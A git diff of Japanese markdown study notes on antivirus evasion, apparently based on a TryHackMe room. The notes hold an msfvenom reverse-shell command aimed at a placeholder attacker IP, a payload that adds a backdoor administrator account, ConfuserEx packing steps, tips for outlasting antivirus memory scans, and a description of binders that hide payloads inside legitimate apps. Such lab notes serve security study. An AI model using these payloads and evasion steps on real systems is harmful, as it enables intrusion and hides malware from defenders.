@@ -2,6 +2,8 @@
     - [AV Evasion：概念と理論](AV%20Evasion：概念と理論.md)
     - [PE構造とシェルコード](PE構造とシェルコード.md)
 
+- 画像ソース：[tryhackme]()
+
 > [!TIP]
 > EXEよりもDLLのほうがAV回避の成功確率が高い。
 
@@ -167,7 +169,7 @@ csc.exe EncStageless.cs
 
 $$Packerによる構造変化$$
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230621094958.png)
+![](../../画像ファイル/Pasted%20image%2020230621094958.png)
 
 $$Packer実行時の挙動$$
 
@@ -182,14 +184,14 @@ $$Packer実行時の挙動$$
 
 ConfuserExは.NETアプリケーション用のPacker（🔗[ConfuserEx](https://github.com/mkaring/ConfuserEx)）。
 
-**1. シェルコード生成**
+### コードの用意
 
+1. シェルコード生成
 ```zsh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f csharp
 ```
 
-**2. ペイロードコード（C#）**
-
+2. ペイロードコード（C#）
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -214,38 +216,35 @@ public class Program {
 }
 ```
 
-**3. コンパイル**
-
+3. コンパイル
 ```powershell
 csc UnEncStagelessPayload.cs
 ```
 
-**4. ConfuserExによるパッキング手順**
+### ConfuserExによるパッキング手順
 
 1. GUI起動後、Base DirectoryをDesktopに設定
 2. `+`ボタンでexeを追加
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230621103157.png)
+![](../../画像ファイル/Pasted%20image%2020230621103157.png)
 
 3. Settingsタブでpayloadを選択し、`+`で`true`という名前のルールを追加
+
 4. "Packer"の左横の□を押してCompressorもONにする
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230621103127.png)
+![](../../画像ファイル/Pasted%20image%2020230621103127.png)
 
 5. Rulesのtrueを編集し、PresetをMaximumに変更
+
 6. Protectタブから`Protect!`をクリック
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230621103329.png)
+![](../../画像ファイル/Pasted%20image%2020230621103329.png)
 
-**5. 実行**
+後は実行すると`Desktop/Confused/`にpacked shellcodeの実行ファイルが生成される。ncなどでリスナーを立てた状態で実行する。
 
-`Desktop/Confused/`にpacked shellcodeの実行ファイルが生成される。ncなどでリスナーを立てた状態で実行する。
-
-**AV検出回避のTips：**
-
-- リバースシェル確立後5分ほど待つとAVのメモリスキャンが終了する
-- 小さなペイロードを使う（リバースシェルでなく単一コマンド実行型にする）
-
+>[!TIP] AV検出回避のTips
+>- リバースシェル確立後5分ほど待つとAVのメモリスキャンが終了する
+>- 小さなペイロードを使う（リバースシェルでなく単一コマンド実行型にする）
 ```zsh
 msfvenom -a x64 -p windows/x64/exec CMD="net user pwnd Password321 /add;net localgroup administrators pwnd /add" -f csharp
 ```
@@ -258,7 +257,7 @@ msfvenom -a x64 -p windows/x64/exec CMD="net user pwnd Password321 /add;net loca
 
 複数の実行ファイルを1つに統合するプログラム。正規のアプリケーションにペイロードを埋め込み、ユーザーには通常のアプリを動かしていると思わせる。AVバイパスの直接的な手法ではなく、**ユーザーを欺く**ことが主目的。
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020230621104916.png)
+![](../../画像ファイル/Pasted%20image%2020230621104916.png)
 
 $$Binderを用いたシェルコード実行の流れ$$
 
